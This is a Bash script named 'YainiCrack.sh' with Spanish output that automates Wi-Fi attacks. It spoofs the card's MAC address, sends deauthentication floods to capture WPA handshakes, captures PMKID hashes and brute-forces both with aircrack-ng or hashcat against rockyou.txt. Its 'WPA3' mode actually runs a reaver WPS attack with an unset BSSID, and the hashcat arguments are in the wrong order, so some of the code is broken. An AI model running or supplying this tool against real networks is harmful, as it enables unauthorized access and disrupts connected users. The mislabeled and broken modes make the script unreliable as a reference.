#!/bin/bash

# Author: s4vitar - nmap y pa' dentro

# Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
skyBlueColour="\e[0;36m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
grayColour="\e[0;37m\033[1m"

# ASCII Art
asciiArt() {
    echo -e "${skyBlueColour}"
    echo " __   __        _         _  _____                     _    "
    echo " \ \ / /       (_)       (_)/  __ \                   | |   "
    echo "  \ V /   __ _  _  _ __   _ | /  \/ _ __   __ _   ___ | | __"
    echo "   \ /   / _\` || || '_ \\ | || |    | '__| / _\` | / __|| |/ /"
    echo "   | |  | (_| || || | | || || \\__/| |   | (_| || (__ |   < "
    echo "   \\_/   \\__,_||_||_| |_||_| \\____/|_|    \\__,_| \\___||_|\\_\\"
    echo -e "${endColour}"
}

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Saliendo${endColour}"
    tput cnorm
    airmon-ng stop ${networkCard}mon > /dev/null 2>&1
    rm Captura* 2>/dev/null
    exit 0
}

function helpPanel() {
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./YainiCrack.sh${endColour}"
    echo -e "\n\t${purpleColour}a)${endColour}${yellowColour} Modo de ataque${endColour}"
    echo -e "\t\t${redColour}Handshake${endColour}"
    echo -e "\t\t${redColour}PKMID${endColour}"
    echo -e "\t\t${redColour}WPA3${endColour}"
    echo -e "\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}"
    echo -e "\t${purpleColour}h)${endColour}${yellowColour} Mostrar este panel de ayuda${endColour}\n"
    exit 0
}

function dependencies() {
    tput civis
    clear
    dependencies=(aircrack-ng macchanger hcxdumptool hashcat reaver xterm)

    echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...${endColour}"
    sleep 2

    for program in "${dependencies[@]}"; do
        echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta${endColour}${purpleColour} $program${endColour}${blueColour}...${endColour}"

        if command -v $program &> /dev/null; then
            echo -e " ${greenColour}(V)${endColour}"
        else
            echo -e " ${redColour}(X)${endColour}\n"
            echo -e "${yellowColour}[*]${endColour}${grayColour} Instalando herramienta ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
            apt-get install $program -y > /dev/null 2>&1
        fi
        sleep 1
    done
}

function startAttack() {
    clear
    echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
    airmon-ng start $networkCard > /dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo -e "${redColour}[!] Error al iniciar airmon-ng en $networkCard${endColour}"
        exit 1
    fi

    ifconfig ${networkCard}mon down
    macchanger -a ${networkCard}mon > /dev/null 2>&1
    ifconfig ${networkCard}mon up
    killall dhclient wpa_supplicant 2>/dev/null

    new_mac=$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')
    echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$new_mac${endColour}${purpleColour}]${endColour}"

    if [ "$attack_mode" == "Handshake" ]; then
        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque Handshake.${endColour}"
        xterm -hold -e "airodump-ng ${networkCard}mon" &
        airodump_xterm_PID=$!
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel

        kill -9 $airodump_xterm_PID 2>/dev/null
        wait $airodump_xterm_PID 2>/dev/null

        xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
        airodump_filter_xterm_PID=$!

        sleep 5
        xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
        aireplay_xterm_PID=$!
        sleep 10
        kill -9 $aireplay_xterm_PID 2>/dev/null
        wait $aireplay_xterm_PID 2>/dev/null

        sleep 10
        kill -9 $airodump_filter_xterm_PID 2>/dev/null
        wait $airodump_filter_xterm_PID 2>/dev/null

        xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
    elif [ "$attack_mode" == "PKMID" ]; then
        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque PKMID.${endColour}"
        timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
        echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
        hcxpcaptool -z myHashes Captura
        rm Captura 2>/dev/null

        if [ -f myHashes ]; then
            echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
            hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
        else
            echo -e "\n${redColour}[!] No se ha podido capturar el paquete necesario...${endColour}\n"
            rm Captura* 2>/dev/null
            sleep 2
        fi
    elif [ "$attack_mode" == "WPA3" ]; then
        echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ataque WPA3.${endColour}"
        reaver -i ${networkCard}mon -b $bssid -K 1 -vv
    else
        echo -e "\n${redColour}[*] Este modo de ataque no es válido${endColour}\n"
    fi
}

# Main Function

if [ "$(id -u)" == "0" ]; then
    asciiArt
    declare -i parameter_counter=0
    while getopts ":a:n:h:" arg; do
        case $arg in
            a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
            n) networkCard=$OPTARG; let parameter_counter+=1 ;;
            h) helpPanel ;;
        esac
    done

    if [ $parameter_counter -ne 2 ]; then
        helpPanel
    else
        dependencies
        startAttack
        tput cnorm
    fi
else
    echo -e "\n${redColour}[!] Debes ser root para ejecutar este script${endColour}\n"
    exit 1
fi
